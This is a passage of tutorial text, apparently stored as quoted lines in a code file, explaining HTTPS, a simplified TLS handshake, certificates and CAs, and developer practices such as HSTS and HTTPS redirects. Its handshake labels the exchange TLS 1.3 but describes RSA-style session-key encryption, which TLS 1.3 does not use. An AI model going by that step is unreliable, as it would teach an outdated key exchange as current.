    "## HTTPS and TLS",
    "",
    "```",
    "HTTP:  Plain text. Anything between you and server can read it.",
    "HTTPS: Encrypted using TLS (Transport Layer Security).",
    "",
    "TLS Handshake (simplified):",
    "  1. Client: 'Hello, I support TLS 1.3, here are my cipher suites'",
    "  2. Server: 'I choose AES-256. Here is my certificate (public key).'",
    "  3. Client: verifies certificate against trusted CAs",
    "  4. Client: generates random session key, encrypts with server's public key",
    "  5. Server: decrypts with private key. Now both have same session key.",
    "  6. All subsequent communication encrypted with symmetric session key.",
    "",
    "Certificate: proves you're really talking to bank.com (not an impersonator)",
    "  Signed by a trusted Certificate Authority (Let's Encrypt, DigiCert)",
    "  Browser has list of trusted CAs built in",
    "",
    "HTTPS requirements for developers:",
    "  - Always HTTPS in production (never HTTP for sensitive data)",
    "  - HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains",
    "    (tells browser: ONLY use HTTPS for this domain for 1 year)",
    "  - Redirect HTTP to HTTPS at load balancer/nginx",
    "  - Don't log sensitive data (passwords, tokens, card numbers)",
